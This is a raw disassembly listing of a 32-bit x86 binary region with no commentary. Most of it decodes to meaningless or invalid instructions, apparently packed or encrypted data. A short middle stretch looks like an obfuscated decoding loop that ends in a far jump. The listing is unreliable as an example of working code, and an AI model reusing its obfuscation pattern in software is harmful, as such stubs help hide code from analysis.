  40d9e6:	add    dh,BYTE PTR [ebx-0x766b71c3]
  40d9ec:	mov    ecx,0xb63d1e82
  40d9f1:	in     eax,0xe5
  40d9f3:	inc    esp
  40d9f4:	push   cs
  40d9f5:	(bad)  
  40d9f6:	pop    ebx
  40d9f7:	fldenv [ebp-0x29c4d843]
  40d9fd:	add    dh,bl
  40d9ff:	mov    edx,DWORD PTR [ebx+0x20]
  40da02:	xor    bh,BYTE PTR [eax]
  40da04:	lahf   
  40da05:	(bad)  
  40da06:	out    0x76,eax
  40da08:	arpl   di,di
  40da0a:	mov    ds:0xc1e183bf,al
  40da0f:	icebp  
  40da10:	shl    BYTE PTR [eax-0x5e1ef646],cl
  40da16:	mov    al,0xd6
  40da18:	das    
  40da19:	ret    0xa9cd
  40da1c:	repnz fsub st(5),st
  40da1f:	xchg   ebx,eax
  40da20:	sub    dh,BYTE PTR [ecx]
  40da22:	lahf   
  40da23:	dec    edx
  40da24:	out    0x5f,al
  40da26:	in     eax,dx
  40da27:	arpl   sp,di
  40da29:	or     esi,0xffffff8b
  40da2c:	mov    edi,DWORD PTR [ebx+esi*1+0x29fdce6d]
  40da33:	dec    edi
  40da34:	ins    DWORD PTR es:[edi],dx
  40da35:	mov    esp,0xef0942de
  40da3a:	test   DWORD PTR [ebp+ecx*2-0x7b3813ab],eax
  40da41:	sbb    eax,0x53f4c860
  40da46:	and    DWORD PTR [esi+0x48ed711a],edx
  40da4c:	es pop ecx
  40da4e:	cdq    
  40da4f:	push   ss
  40da50:	dec    ebx
  40da51:	fiadd  DWORD PTR [edx]
  40da53:	loopne 0x40da15
  40da55:	inc    esi
  40da56:	scas   al,BYTE PTR es:[edi]
  40da57:	fcmove st,st(2)
  40da59:	inc    edx
  40da5a:	js     0x40dac8
  40da5c:	cmp    dh,BYTE PTR [edx+0x50a55416]
  40da62:	shr    BYTE PTR [esi+ebp*4+0x32b25d9c],1
  40da69:	sub    eax,0x57964dc5
  40da6e:	bswap  ecx
  40da70:	and    DWORD PTR [edi],eax
  40da72:	fcomp  DWORD PTR [eax+0x3bacc478]
  40da78:	sub    BYTE PTR [eax],ch
  40da7a:	cwde   
  40da7b:	push   es
  40da7c:	jge    0x40da49
  40da7e:	(bad)  
  40da7f:	pop    ecx
  40da80:	shl    DWORD PTR [ebp+ebp*4+0x3195f320],1
  40da87:	retf   0x7bb6
  40da8a:	push   ecx
  40da8b:	fstp   TBYTE PTR ss:[esi]
  40da8e:	cmp    BYTE PTR [edx+0x4aa2cb1a],0x4
  40da95:	sub    BYTE PTR [ebx+ebx*4+0x17],bl
  40da99:	call   0x633c:0x1a873a86
  40daa0:	sbb    bl,BYTE PTR [eax-0x3271c634]
  40daa6:	lea    ebx,[edi-0x263da7b6]
  40daac:	push   es
  40daad:	xchg   ebx,eax
  40daae:	add    esi,DWORD PTR [esi]
  40dab0:	add    dl,BYTE PTR [edi-0x13b60ab7]
  40dab6:	jmp    0xb9ee196c
  40dabb:	push   edi
  40dabc:	bound  ebx,QWORD PTR [ecx]
  40dabe:	outs   dx,DWORD PTR ds:[esi]
  40dabf:	stos   DWORD PTR es:[edi],eax
  40dac0:	xchg   ecx,eax
  40dac1:	sub    eax,0x918c0d77
  40dac6:	dec    eax
  40dac7:	pushf  
  40dac8:	loopne 0x40db25
  40daca:	jmp    0xaa64:0x5b2c7257
  40dad1:	cwde   
  40dad2:	push   cs
  40dad3:	pop    edx
  40dad4:	sar    DWORD PTR [ebx+0x3a],cl
  40dad7:	inc    eax
  40dad8:	sub    al,0xb0
  40dada:	test   BYTE PTR [eax],dl
  40dadc:	outs   dx,DWORD PTR ds:[esi]
  40dadd:	enter  0x5bcd,0x13
  40dae1:	mov    ch,0x64
  40dae3:	sub    al,0xb3
  40dae5:	xor    esp,ebp
  40dae7:	sbb    al,0x74
  40dae9:	xchg   edi,eax
  40daea:	sti    
  40daeb:	cs xor al,0x92
  40daee:	fwait
  40daef:	shl    BYTE PTR [ecx-0x1347ee38],0xc7
  40daf6:	hlt    
  40daf7:	bound  ebp,QWORD PTR [edx+0x6c79e99c]
  40dafd:	or     edx,esp
  40daff:	out    dx,al
  40db00:	xor    ch,BYTE PTR [ecx]
  40db02:	mov    ecx,0xbe3f98ac
  40db07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40db08:	jbe    0x40db67
  40db0a:	mov    BYTE PTR [edx-0x2db36cd2],0x9a
  40db11:	cwde   
  40db12:	xor    eax,DWORD PTR [ecx+0x17d11bda]
  40db18:	xor    DWORD PTR gs:[esp+ebp*4-0x5191bb7],esi
  40db20:	or     BYTE PTR [edi-0x28a53ef0],0xdb
  40db27:	inc    ebx
  40db28:	sbb    eax,0xe48a2949
  40db2d:	aaa    
  40db2e:	sub    eax,0x3ee83817
  40db33:	mov    eax,0x4611529a
  40db38:	enter  0xaee,0xe0
  40db3c:	arpl   WORD PTR [edi+0x5a],ax
  40db3f:	pop    es
  40db40:	leave  
  40db41:	jb     0x40db76
  40db43:	dec    ecx
  40db44:	(bad)  
  40db45:	inc    BYTE PTR [edi]
  40db47:	sub    BYTE PTR [ebx+0x33],dh
  40db4a:	or     al,0x9b
  40db4c:	adc    ebp,DWORD PTR [ebx]
  40db4e:	or     BYTE PTR [eax-0xd],ch
  40db51:	out    dx,eax
  40db52:	(bad)  
  40db54:	pushf  
  40db55:	test   DWORD PTR [ebx+0x1e],edi
  40db58:	jl     0x40db1c
  40db5a:	mov    BYTE PTR [eax+0x4217e1a2],ch
  40db60:	inc    esi
  40db61:	xor    BYTE PTR [ebx+0x5d12b7e6],ah
  40db67:	pop    edi
  40db68:	lods   al,BYTE PTR ds:[esi]
  40db69:	js     0x40dbcc
  40db6b:	inc    ebx
  40db6c:	scas   al,BYTE PTR es:[edi]
  40db6d:	inc    edx
  40db6e:	aam    0x8e
  40db70:	mov    al,0x80
  40db72:	aam    0x92
  40db74:	pop    ebx
  40db75:	int3   
  40db76:	xchg   esi,eax
  40db77:	adc    BYTE PTR [ecx+0x51],dl
  40db7a:	push   edx
  40db7b:	pop    ebx
  40db7c:	call   0x7bf3cc68
  40db81:	sbb    eax,0x5d81970c
  40db86:	leave  
  40db87:	pushf  
  40db88:	dec    edi
  40db89:	cdq    
  40db8a:	sti    
  40db8b:	jp     0x40db0f
  40db8d:	push   ds
  40db8e:	outs   dx,DWORD PTR ds:[esi]
  40db8f:	pop    edi
  40db90:	sbb    esi,DWORD PTR [ecx]
  40db92:	mov    ebp,eax
  40db94:	leave  
  40db95:	mov    al,0xb7
  40db97:	or     esi,esp
  40db99:	mov    ds:0x5f68f65c,al
  40db9e:	retf   
  40db9f:	cmp    cl,BYTE PTR [edi]
  40dba1:	test   al,0xa3
  40dba3:	xor    DWORD PTR [ecx+esi*1-0x5c9fb6f4],esi
  40dbaa:	jg     0x40db5c
  40dbac:	cmp    ch,0xf1
  40dbaf:	adc    eax,0xc8c4e1b7
  40dbb4:	call   0xa5eb:0x20bdea38
  40dbbb:	fwait
  40dbbc:	mov    al,ds:0xd78c3530
  40dbc1:	pop    ebx
  40dbc2:	fwait
  40dbc3:	xadd   BYTE PTR [esi-0x57],bl
  40dbc7:	cmp    BYTE PTR [eax+0x6a82bb5a],dl
  40dbcd:	mov    esp,?
  40dbcf:	xchg   BYTE PTR [ebp-0x78],cl
  40dbd2:	sub    DWORD PTR [edi],0x7
  40dbd5:	shld   DWORD PTR [ebx+ebp*2+0x53006003],esi,cl
  40dbdd:	add    edi,edx
  40dbdf:	pop    esi
  40dbe0:	jns    0x40db64
  40dbe2:	mov    ds:0x11c2bacd,eax
  40dbe7:	push   esi
  40dbe8:	cmp    edi,ebp
  40dbea:	push   edx
  40dbeb:	inc    edi
  40dbec:	pop    esi
  40dbed:	fistp  WORD PTR [ebp+edi*1-0x22]
  40dbf1:	jecxz  0x40dc16
  40dbf3:	mov    esp,0xc49f78d6
  40dbf8:	mov    ah,BYTE PTR [esi+0x3dd99f1a]
  40dbfe:	inc    esi
  40dbff:	outs   dx,BYTE PTR ds:[esi]
  40dc00:	icebp  
  40dc01:	dec    edi
  40dc02:	sub    DWORD PTR [edi-0x2288d8ea],ebx
  40dc08:	retf   0x92fb
  40dc0b:	adc    al,0x8d
  40dc0d:	dec    edx
  40dc0e:	xchg   edi,eax
  40dc0f:	and    bl,BYTE PTR [ecx+0x54]
  40dc12:	jecxz  0x40dbee
  40dc14:	popa   
  40dc15:	jmp    eax
  40dc17:	loope  0x40dc07
  40dc19:	add    esp,ecx
  40dc1b:	out    0x81,al
  40dc1d:	fcomp  DWORD PTR [ebp-0x66]
  40dc20:	mov    al,0x86
  40dc22:	call   FWORD PTR [edi-0x27]
  40dc25:	mov    cl,0xcf
  40dc27:	jecxz  0x40dc8d
  40dc29:	into   
  40dc2a:	popa   
  40dc2b:	mov    ds:0x60a550db,eax
  40dc30:	stos   DWORD PTR es:[edi],eax
  40dc31:	xor    edx,ebx
  40dc33:	lock cli 
  40dc35:	in     al,dx
  40dc36:	xchg   edx,edx
  40dc38:	cli    
  40dc39:	add    eax,DWORD PTR [eax+eiz*1-0x7c]
  40dc3d:	and    al,0x25
  40dc3f:	mov    eax,ds:0x89f150d8
  40dc44:	js     0x40dc93
  40dc46:	imul   esi,DWORD PTR [esi+ebp*2],0x29834681
  40dc4d:	call   0x2ffe:0xf9918ea7
  40dc54:	(bad)  
  40dc55:	leave  
  40dc56:	popa   
  40dc57:	mov    ebp,0xa8552a93
  40dc5c:	or     BYTE PTR [edx+0x59],al
  40dc5f:	jbe    0x40dc9e
  40dc61:	jmp    0x3509:0xb78a8c9d
  40dc68:	and    edi,DWORD PTR [edi+0x744b6329]
  40dc6e:	ins    BYTE PTR es:[edi],dx
  40dc6f:	dec    eax
  40dc70:	jb     0x40dce8
  40dc72:	rol    DWORD PTR [ebp-0x71],cl
  40dc75:	add    eax,DWORD PTR [edx]
  40dc77:	cmp    eax,ebp
  40dc79:	mov    ebp,0xd545d78a
  40dc7e:	out    0x36,al
  40dc80:	adc    dh,dh
  40dc82:	inc    esp
  40dc83:	and    ah,dl
  40dc85:	add    ebx,DWORD PTR [ebp-0x76]
  40dc88:	push   ss
  40dc89:	inc    ebx
  40dc8a:	lock add al,0x91
  40dc8d:	inc    esi
  40dc8e:	data16 int 0x63
  40dc91:	xor    ebx,DWORD PTR [esi]
  40dc93:	fldenv gs:[esi-0x37168871]
  40dc9a:	xor    BYTE PTR [ecx],cl
  40dc9c:	fdiv   QWORD PTR [eax-0x44]
  40dc9f:	ja     0x40dd02
  40dca1:	shl    DWORD PTR [edi],cl
  40dca3:	cmp    al,0xdd
  40dca5:	fmul   QWORD PTR [eax-0x26]
  40dca8:	mov    cl,0x29
  40dcaa:	fdivr  st,st(2)
  40dcac:	push   0xedf4c1fa
  40dcb1:	(bad)  
  40dcb2:	fdiv   QWORD PTR [esi-0x48a2688]
  40dcb8:	xchg   ecx,ebp
  40dcba:	retf   0xe6bb
  40dcbd:	inc    esi
  40dcbe:	loopne 0x40dce6
  40dcc0:	leave  
  40dcc1:	xor    DWORD PTR [ebx-0x36a21ddf],ebx
  40dcc7:	jl     0x40dd2b
  40dcc9:	scas   eax,DWORD PTR es:[edi]
  40dcca:	fldenv [ebx+edx*1-0x7444990c]
  40dcd1:	xor    DWORD PTR [edx],esi
  40dcd3:	sti    
  40dcd4:	outs   dx,BYTE PTR ds:[esi]
  40dcd5:	enter  0x8af4,0x55
  40dcd9:	cmp    ah,BYTE PTR [ecx-0x37]
  40dcdc:	or     ebp,ebx
  40dcde:	sub    al,bh
  40dce0:	retf   0xf6c1
  40dce3:	clc    
  40dce4:	and    bh,bh
  40dce6:	pop    ecx
  40dce7:	dec    ebx
  40dce8:	xor    eax,0x8d66a0bb
  40dced:	mov    cl,0xf6
  40dcef:	sbb    DWORD PTR ds:0x4145d3f3,edx
  40dcf5:	cmp    BYTE PTR [edx+0x7ea13581],cl
  40dcfb:	jl     0x40dd59
  40dcfd:	inc    esi
  40dcfe:	call   FWORD PTR [ebx+0x2d279a5a]
  40dd04:	pop    es
  40dd05:	inc    edx
  40dd06:	fisub  DWORD PTR [eax+0x470d35b4]
  40dd0c:	jae    0x40dcce
  40dd0e:	adc    al,0x30
  40dd10:	xchg   ebx,eax
  40dd11:	gs adc al,0x66
  40dd14:	lods   eax,DWORD PTR ds:[esi]
  40dd15:	mov    ebp,0x9fd48032
  40dd1a:	sub    ecx,DWORD PTR [eax-0x6b]
  40dd1d:	xchg   dl,al
  40dd1f:	cdq    
  40dd20:	imul   ebx,DWORD PTR [edi-0x1a],0x67d31e90
  40dd27:	aam    0xdb
  40dd29:	push   ecx
  40dd2a:	pusha  
  40dd2b:	fsubrp st(4),st
  40dd2d:	mov    dh,0x2f
  40dd2f:	fs mov al,0x13
  40dd32:	xor    eax,0xa7cefcf2
  40dd37:	mov    bh,dl
  40dd39:	jae    0x40dcbe
  40dd3b:	clc    
  40dd3c:	mov    ecx,0x3481e6f6
  40dd41:	mov    BYTE PTR [edx],dl
  40dd43:	in     al,0x4
  40dd45:	imul   DWORD PTR [esi]
  40dd47:	mov    edx,0x104237e3
  40dd4c:	adc    al,0xfc
  40dd4e:	test   al,0x1f
  40dd50:	repz sti 
  40dd52:	jg     0x40ddb4
  40dd54:	cs out 0x8f,eax
  40dd57:	adc    DWORD PTR [esi-0x79],0x66
  40dd5b:	cmp    eax,0x9a468f85
  40dd60:	jne    0x40dce2
  40dd62:	mov    ah,0xd8
  40dd64:	sbb    eax,0xca5c8b74
  40dd69:	call   0xea6ce7a7
  40dd6e:	xchg   ebx,eax
  40dd6f:	mov    bl,BYTE PTR [edx-0x399a2a10]
  40dd75:	aas    
  40dd76:	retf   
  40dd77:	push   ecx
  40dd78:	(bad)  [edx+0x26]
  40dd7b:	jp     0x40ddf6
  40dd7d:	outs   dx,DWORD PTR ds:[esi]
  40dd7e:	xchg   ebx,eax
  40dd7f:	mov    al,BYTE PTR [eax]
  40dd81:	pop    esi
  40dd82:	out    dx,eax
  40dd83:	push   ds
  40dd84:	and    eax,0xefded8c8
  40dd89:	loope  0x40ddb4
  40dd8b:	(bad)  
  40dd8e:	mov    cl,0xa7
  40dd90:	aam    0x34
  40dd92:	pop    edi
  40dd93:	fcom   QWORD PTR [esi+esi*4+0x59]
  40dd97:	jge    0x40dded
  40dd99:	bound  eax,QWORD PTR [edx]
  40dd9b:	jl     0x40dd50
  40dd9d:	enter  0xc10a,0xbc
  40dda1:	call   0xac2fc30c
  40dda6:	adc    esp,DWORD PTR [esi-0x32]
  40dda9:	jns    0x40de0d
  40ddab:	aam    0x2a
  40ddad:	add    esi,DWORD PTR ds:0x901912c0
  40ddb3:	and    DWORD PTR [edi+ebx*8],esi
  40ddb6:	and    eax,0x6de6dfcf
  40ddbb:	mov    ecx,0xf573431f
  40ddc0:	xchg   BYTE PTR [ebx],cl
  40ddc2:	rol    BYTE PTR ds:0x341a5853,cl
  40ddc8:	cs adc eax,0x8e7aecad
  40ddce:	and    eax,0xa046fc77
  40ddd3:	ds cwde 
  40ddd5:	or     DWORD PTR [eax-0x1de8c9ef],edi
  40dddb:	fsub   DWORD PTR [ecx+eax*4]
  40ddde:	inc    ebp
  40dddf:	push   ds
  40dde0:	push   cs
  40dde1:	cmc    
  40dde2:	int    0xa4
  40dde4:	adc    dl,BYTE PTR [edx+0x7c]
  40dde7:	das    
  40dde8:	shr    DWORD PTR ds:0xc104c859,1
  40ddee:	jne    0x40ddca
  40ddf0:	(bad)  
  40ddf1:	lahf   
  40ddf2:	jle    0x40ddc5
  40ddf4:	mov    ebx,0xbf9ad52d
  40ddf9:	(bad)  [edx]
  40ddfb:	call   0xac8c:0x10fe870e
  40de02:	xor    dl,BYTE PTR [edi-0x61]
  40de05:	mov    ecx,0x4bfc1e55
  40de0a:	sbb    dl,ah
  40de0c:	pop    edi
  40de0d:	out    0x3f,al
  40de0f:	push   ss
  40de10:	in     eax,0xcb
  40de12:	add    ecx,DWORD PTR [eax-0x37]
  40de15:	sub    al,0x9d
  40de17:	cmp    al,0x36
  40de19:	fdivr  DWORD PTR [ecx+0x5b]
  40de1c:	nop
  40de1d:	ds push 0xffffffc6
  40de20:	iret   
  40de21:	cmp    BYTE PTR [eax-0x59],al
  40de24:	push   eax
  40de25:	mov    eax,0x5167c3d5
  40de2a:	popa   
  40de2b:	outs   dx,DWORD PTR ds:[esi]
  40de2c:	out    0x34,eax
  40de2e:	out    0x8f,al
  40de30:	or     BYTE PTR [ebx+edi*8+0x4b],ch
  40de34:	pop    esp
  40de35:	jmp    0x40de61
  40de37:	jbe    0x40dde1
  40de39:	shr    BYTE PTR [eax-0x17],1
  40de3c:	xchg   ecx,ebx
  40de3e:	xor    bh,BYTE PTR [edi+0x55]
  40de41:	out    dx,eax
  40de42:	inc    ecx
  40de43:	adc    ebp,DWORD PTR [edi-0x32cdeee7]
  40de49:	cmp    bh,BYTE PTR [ebx+0x59]
  40de4c:	cmc    
  40de4d:	or     eax,0x458b20e8
  40de52:	cld    
  40de53:	push   ebx
  40de54:	mov    DWORD PTR ds:0x42500c,0x32d4
  40de5e:	je     0x40deb5
  40de64:	or     DWORD PTR ds:0x427000,ecx
  40de6a:	mov    esi,DWORD PTR [ebp-0x18]
  40de6d:	mov    DWORD PTR ds:0x429000,0x1a4f
  40de77:	add    DWORD PTR [eax],esi
  40de79:	mov    eax,DWORD PTR [ebp-0x4]
  40de7c:	xor    esi,esi
  40de7e:	or     esi,DWORD PTR ds:0x428010
  40de84:	or     DWORD PTR ds:0x42600c,esi
  40de8a:	mov    esi,DWORD PTR [ebp+0xc]
  40de8d:	dec    DWORD PTR ds:0x428014
  40de93:	xor    esi,ecx
  40de95:	add    esi,edx
  40de97:	sub    DWORD PTR ds:0x426014,0x425028
  40dea1:	imul   esi,DWORD PTR [eax]
  40dea4:	mov    DWORD PTR ds:0x42701c,0x7c46
  40deae:	mov    DWORD PTR [eax],esi
  40deb0:	jmp    0x40dec4
  40deb5:	sub    DWORD PTR ds:0x427010,0x59d5
  40debf:	mov    esi,DWORD PTR [ebp+0x14]
  40dec2:	xor    DWORD PTR [eax],esi
  40dec4:	sub    esi,edi
  40dec6:	mov    eax,DWORD PTR [ebp-0x4]
  40dec9:	and    DWORD PTR ds:0x42801c,0x11ac
  40ded3:	mov    edi,DWORD PTR [ebp+0x10]
  40ded6:	add    ebx,esi
  40ded8:	xor    edi,ecx
  40deda:	or     DWORD PTR ds:0x429010,ebx
  40dee0:	mov    esi,0xffcd8d25
  40dee5:	dec    DWORD PTR ds:0x42801c
  40deeb:	mov    ebx,esi
  40deed:	sub    ebx,edi
  40deef:	add    DWORD PTR [eax],ebx
  40def1:	mov    DWORD PTR ds:0x425020,0x1c
  40defb:	cmp    DWORD PTR ds:0x425020,0x0
  40df02:	je     0x40df56
  40df08:	cmp    DWORD PTR ds:0x425020,0x9
  40df0f:	jne    0x40df28
  40df15:	push   DWORD PTR [ebp-0x28]
  40df18:	push   0x8d04
  40df1d:	push   0x4e0d
  40df22:	call   DWORD PTR ds:0x421020
  40df28:	cmp    DWORD PTR ds:0x425020,0xa
  40df2f:	jne    0x40df42
  40df35:	mov    edi,DWORD PTR ds:0x425020
  40df3b:	dec    edi
  40df3c:	mov    DWORD PTR ds:0x425020,edi
  40df42:	xor    edi,edi
  40df44:	xor    edi,DWORD PTR ds:0x425020
  40df4a:	dec    edi
  40df4b:	mov    DWORD PTR ds:0x425020,edi
  40df51:	jmp    0x40defb
  40df56:	mov    eax,DWORD PTR [ebp-0x4]
  40df59:	mov    edi,DWORD PTR [ebp-0x8]
  40df5c:	add    edi,DWORD PTR [eax]
  40df5e:	mov    DWORD PTR [ebp-0x8],edi
  40df61:	mov    eax,DWORD PTR [ebp+0xc]
  40df64:	mov    edi,DWORD PTR [ebp+0xc]
  40df67:	xor    edi,ecx
  40df69:	xor    eax,ecx
  40df6b:	lea    eax,[eax+edi*1+0x64e5b6]
  40df72:	mov    edi,DWORD PTR [ebp+0xc]
  40df75:	xor    edi,ecx
  40df77:	add    edi,edx
  40df79:	imul   eax,edi
  40df7c:	mov    edi,DWORD PTR [ebp+0xc]
  40df7f:	xor    edi,ecx
  40df81:	sub    edi,eax
  40df83:	mov    eax,DWORD PTR [ebp-0x4]
  40df86:	add    edi,edx
  40df88:	cmp    DWORD PTR [eax],edi
  40df8a:	mov    eax,DWORD PTR [ebp-0x4]
  40df8d:	mov    edi,DWORD PTR [ebp+0x10]
  40df90:	jg     0x40dfa3
  40df96:	xor    edi,ecx
  40df98:	mov    ebx,esi
  40df9a:	sub    ebx,edi
  40df9c:	add    DWORD PTR [eax],ebx
  40df9e:	jmp    0x40dfa9
  40dfa3:	xor    edi,ecx
  40dfa5:	add    edi,edx
  40dfa7:	add    DWORD PTR [eax],edi
  40dfa9:	mov    eax,DWORD PTR [ebp-0x8]
  40dfac:	mov    edi,DWORD PTR [ebp-0x10]
  40dfaf:	mov    eax,DWORD PTR [eax]
  40dfb1:	xor    edi,ecx
  40dfb3:	add    edi,0x3272da
  40dfb9:	not    edi
  40dfbb:	and    eax,edi
  40dfbd:	movsx  di,BYTE PTR [eax+0x1]
  40dfc2:	jmp    0x41036d
  40dfc7:	jge    0x40e029
  40dfc9:	xor    al,0x4e
  40dfcb:	xor    eax,DWORD PTR [esi]
  40dfcd:	add    ecx,DWORD PTR [edi-0x5e]
  40dfd0:	mov    dl,0x21
  40dfd2:	mov    al,0x7f
  40dfd4:	dec    eax
  40dfd5:	pop    ds
  40dfd6:	and    eax,0x6262d2c5
  40dfdb:	hlt    
  40dfdc:	pop    edi
  40dfdd:	bound  esp,QWORD PTR [edx-0x50]
  40dfe0:	jge    0x40e05b
  40dfe2:	repnz dec esp
  40dfe4:	adc    BYTE PTR [ebp+0x70a3ff0],cl
  40dfea:	sbb    DWORD PTR [ebx-0x37fad4c1],ecx
  40dff0:	test   al,0x1a
  40dff2:	rol    DWORD PTR [ecx+0x1c],0xb9
  40dff6:	add    BYTE PTR [edx-0x1f94145d],ah
  40dffc:	mov    WORD PTR [ecx+0x79],?
  40dfff:	pop    edx
  40e000:	ret    0xf0cd
  40e003:	push   ss
  40e004:	adc    ecx,esi
  40e006:	xlat   BYTE PTR ds:[ebx]
  40e007:	sbb    eax,0x531af809
  40e00c:	dec    edi
  40e00d:	imul   ebp,DWORD PTR [esi-0x39],0xffffffdc
  40e011:	add    al,BYTE PTR [ecx-0x31]
  40e014:	in     al,0xd7
  40e016:	dec    ecx
  40e017:	mov    dh,bl
  40e019:	pop    edi
  40e01a:	jp     0x40dffe
  40e01c:	in     al,dx
  40e01d:	jb     0x40e030
  40e01f:	and    ebp,DWORD PTR [ebp-0x4ec73de3]
  40e025:	into   
  40e026:	outs   dx,DWORD PTR ds:[esi]
  40e027:	mov    edi,0xa3fd01c3
  40e02c:	pop    ebp
  40e02d:	(bad)  
  40e02e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e02f:	into   
  40e030:	inc    edx
  40e031:	mov    ebx,0xbc4009c3
  40e036:	icebp  
  40e037:	mov    cl,0xc8
  40e039:	jb     0x40dfef
  40e03b:	xchg   edi,eax
  40e03c:	test   al,cl
  40e03e:	test   al,0x59
  40e040:	pop    ebp
  40e041:	cmc    
  40e042:	stos   DWORD PTR es:[edi],eax
  40e043:	enter  0xcb74,0xe5
  40e047:	loop   0x40e0b2
  40e049:	ds push edi
  40e04b:	push   esp
  40e04c:	mov    al,ds:0xe6c687ce
  40e051:	lds    ebp,FWORD PTR [edx+0x77b5b7fe]
  40e057:	cmp    al,0xa5
  40e059:	lock aad 0xbb
  40e05c:	int    0x3f
  40e05e:	push   ss
  40e05f:	mov    ecx,DWORD PTR [eax+0x56295060]
  40e065:	gs pop ds
  40e067:	jl     0x40e041
  40e069:	rcr    DWORD PTR [ebx+0x3b],1
  40e06c:	and    esp,edi
  40e06e:	add    DWORD PTR [ecx-0x2f38d405],0x5a
  40e075:	scas   eax,DWORD PTR es:[edi]
  40e076:	repz add cl,dl
  40e079:	rol    edx,1
  40e07b:	loopne 0x40e0d9
  40e07d:	dec    eax
  40e07e:	push   0x9fc6cf4f
  40e083:	pop    esp
  40e084:	jp     0x40e03c
  40e086:	jno    0x40e03e
  40e088:	fsubr  DWORD PTR [edi+0x150f1a25]
  40e08e:	mov    es,WORD PTR [ebp+0xa]
  40e091:	jbe    0x40e101
  40e093:	mov    edi,0x53fb62bf
  40e098:	je     0x40e0f4
  40e09a:	push   edx
  40e09b:	cs cli 
  40e09d:	add    eax,0x21c9df01
  40e0a2:	loop   0x40e078
  40e0a4:	gs test al,0x38
  40e0a7:	jnp    0x40e107
  40e0a9:	add    ecx,0x27
  40e0ac:	gs rcl BYTE PTR ss:[esi-0x25],1
  40e0b1:	mov    eax,esp
  40e0b3:	ds xchg esi,eax
  40e0b5:	inc    ecx
  40e0b6:	std    
  40e0b7:	pop    eax
  40e0b8:	cmp    eax,0x520240b7
  40e0bd:	adc    BYTE PTR [ebx],al
  40e0bf:	ja     0x40e08e
  40e0c1:	adc    BYTE PTR [edx],ch
  40e0c3:	jns    0x40e127
  40e0c5:	out    dx,al
  40e0c6:	into   
  40e0c7:	int    0x18
  40e0c9:	adc    cl,BYTE PTR [edi]
  40e0cb:	cmp    al,0xa0
  40e0cd:	xchg   esi,eax
  40e0ce:	rcr    DWORD PTR [esi-0x68],0x74
  40e0d2:	jns    0x40e0ac
  40e0d4:	pop    esi
  40e0d5:	popa   
  40e0d6:	xor    al,0xe2
  40e0d8:	mov    ds:0x3be50231,al
  40e0dd:	inc    esp
  40e0de:	jns    0x40e0cb
  40e0e0:	or     BYTE PTR [ebx+0x60],ch
  40e0e3:	out    dx,al
  40e0e4:	sbb    eax,0xac93e90d
  40e0e9:	outs   dx,DWORD PTR ds:[esi]
  40e0ea:	lods   eax,DWORD PTR ds:[esi]
  40e0eb:	add    BYTE PTR [esi],ch
  40e0ed:	mov    bh,0x54
  40e0ef:	jo     0x40e07b
  40e0f1:	cmp    al,0x58
  40e0f3:	loopne 0x40e083
  40e0f5:	and    eax,0x24b9eff6
  40e0fa:	or     ah,ah
  40e0fc:	loope  0x40e0a2
  40e0fe:	imul   ebx,DWORD PTR [ecx],0xffffffe6
  40e101:	aad    0xca
  40e103:	pop    ebx
  40e104:	sti    
  40e105:	mov    ds:0x39355f7c,eax
  40e10a:	por    mm6,mm6
  40e10d:	addr16 call 0xb5cc:0x2d39712
  40e115:	pop    ds
  40e116:	cwde   
  40e117:	data16 jl 0x40e0e6
  40e11a:	dec    eax
  40e11b:	xchg   ebx,eax
  40e11c:	pop    ecx
  40e11d:	inc    edi
  40e11e:	fcmovu st,st(1)
  40e120:	daa    
  40e121:	and    al,0xf9
  40e123:	sub    al,BYTE PTR cs:[ebx+0x60addcf8]
  40e12a:	jne    0x40e0e5
  40e12c:	pop    esi
  40e12d:	outs   dx,DWORD PTR ds:[esi]
  40e12e:	sbb    ecx,DWORD PTR [esi]
  40e130:	mov    al,0xcd
  40e132:	fst    QWORD PTR [ebx]
  40e134:	xchg   ebp,eax
  40e135:	and    eax,esi
  40e137:	pop    edi
  40e138:	push   ss
  40e139:	dec    eax
  40e13a:	inc    eax
  40e13b:	icebp  
  40e13c:	test   DWORD PTR [edx-0x30712350],eax
  40e142:	mov    esi,0x707be2ad
  40e147:	xor    eax,0xd7e9fb4b
  40e14c:	fs pusha 
  40e14e:	mov    DWORD PTR [ebx-0x45],ebx
  40e151:	jle    0x40e1b1
  40e153:	mov    eax,DWORD PTR [edi+edi*8+0x3e]
  40e157:	scas   eax,DWORD PTR es:[edi]
  40e158:	sbb    al,cl
  40e15a:	dec    edi
  40e15b:	jbe    0x40e10a
  40e15d:	jbe    0x40e126
  40e15f:	mov    WORD PTR [esi-0x77],es
  40e162:	mov    al,0xa1
  40e164:	inc    edx
  40e165:	call   0x59077bd9
  40e16a:	sub    eax,0xbfb1d923
  40e16f:	sub    esp,DWORD PTR [eax-0x5fe2ce11]
  40e175:	mov    esi,ecx
  40e177:	mov    cl,0x58
  40e179:	rol    cl,0x73
  40e17c:	cdq    
  40e17d:	fsubr  QWORD PTR [edx-0x7b6b2c37]
  40e183:	nop
  40e184:	jmp    0x40e1a5
  40e186:	repz addr16 es pusha 
  40e18a:	dec    ebx
  40e18b:	sbb    BYTE PTR [esi-0x4d],0x5
  40e18f:	mov    bh,BYTE PTR [ebx-0x6ccf0522]
  40e195:	ins    BYTE PTR es:[edi],dx
  40e196:	pop    es
  40e197:	call   0x288dd7a3
  40e19c:	retf   0xc655
  40e19f:	sti    
  40e1a0:	push   edx
  40e1a1:	xor    BYTE PTR [ebx+0x3e],ah
  40e1a4:	jbe    0x40e167
  40e1a6:	inc    ebx
  40e1a7:	mov    edi,0xe17bfb9d
  40e1ac:	inc    edx
  40e1ad:	imul   ecx,DWORD PTR [esp+ebx*2],0xffffff97
  40e1b1:	mov    eax,0xfece61c3
  40e1b6:	mov    ecx,0xa1146530
  40e1bb:	(bad)  
  40e1bc:	test   BYTE PTR [eax],0xce
  40e1bf:	shl    DWORD PTR [ebx],0xc1
  40e1c2:	(bad)  
  40e1c4:	fdivr  DWORD PTR [eax-0x22]
  40e1c7:	sub    al,0x2
  40e1c9:	and    al,0xb2
  40e1cb:	hlt    
  40e1cc:	loope  0x40e1f9
  40e1ce:	nop
  40e1cf:	(bad)  
  40e1d0:	pop    ds
  40e1d1:	cmp    BYTE PTR [ebp+0x7200915b],0xe7
  40e1d8:	retf   
  40e1d9:	je     0x40e183
  40e1db:	push   ebp
  40e1dc:	lds    ecx,FWORD PTR [eax+0xc6d2b40]
  40e1e2:	in     al,dx
  40e1e3:	cmp    BYTE PTR [edi-0x1f],cl
  40e1e6:	push   ecx
